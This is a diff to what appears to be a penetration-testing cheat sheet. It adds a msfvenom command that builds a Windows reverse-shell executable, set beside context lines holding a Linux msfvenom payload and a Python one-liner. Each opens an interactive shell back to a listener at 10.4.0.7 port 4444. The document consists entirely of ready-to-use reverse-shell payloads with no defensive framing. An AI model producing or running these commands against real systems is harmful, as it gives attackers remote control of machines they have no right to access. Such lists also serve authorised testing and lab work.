@@ -29,6 +29,10 @@ Via msfvenom (still calling back to a nc listener), creating an executable calle
 
 `msfvenom -p linux/x64/shell_reverse_tcp lhost=10.4.0.7 lport=4444 > connect`
 
+For Windows:
+
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.4.0.7 LPORT=4444 EXITFUNC=thread -f exe-only > shell4444.exe`
+
 Python, especially useful if you have python rce by default (in which case just use the contents of the quoted string):
 
 `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.0.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
